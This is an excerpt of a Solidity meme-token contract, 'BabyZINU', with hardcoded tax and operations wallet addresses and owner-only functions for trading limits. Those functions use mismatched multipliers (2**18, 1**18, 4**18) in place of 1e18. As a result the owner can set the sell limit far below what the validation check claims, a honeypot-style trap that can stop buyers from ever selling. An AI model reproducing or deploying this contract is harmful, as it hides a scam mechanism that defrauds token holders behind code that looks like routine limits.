...
/* 
        Terrifying Baby ZINU formed when genes between of Shiba and ZINU collided on accident.
                        All taxes collected will be sent to our father.
                             https://t.me/babyzinu_portal
*/
...
contract BabyZINU is ERC20, Ownable {
    ...
    constructor() ERC20( "BabyZINU", "BabyZ") {
        ...
        maxBuyAmount = totalSupply * 2 / 10000; 
        maxSellAmount = totalSupply * 1 / 10000; 
        maxWalletAmount = totalSupply * 2 / 10000;
        swapTokensAtAmount = totalSupply * 2 / 1000000; 
        ...
        operationsAddress = address(0x005E5a57c74e9DdD26CDb7A0b3Cc5056cBCE5869); // change this address to wallet u want for operations   
        TaxAddress = address(0x36d5e188555567097C25dc54123a2DA49733B547);  // change this address to the one for tax 
    ...
    function updateMaxBuyAmount(uint256 newNum) external onlyOwner {
        ...
        maxBuyAmount = newNum * (2**18);
        emit UpdatedMaxBuyAmount(maxBuyAmount);
    }
    
    function updateMaxSellAmount(uint256 newNum) external onlyOwner {
        require(newNum >= (totalSupply() * 1 / 1000)/1e18, "Cannot set max sell amount lower than 0.1%");
        maxSellAmount = newNum * (1**18);
        emit UpdatedMaxSellAmount(maxSellAmount);
    }

    function updateMaxWalletAmount(uint256 newNum) external onlyOwner {
        require(newNum >= (totalSupply() * 3 / 1000)/1e18, "Cannot set max wallet amount lower than 0.3%");
        maxWalletAmount = newNum * (4**18);
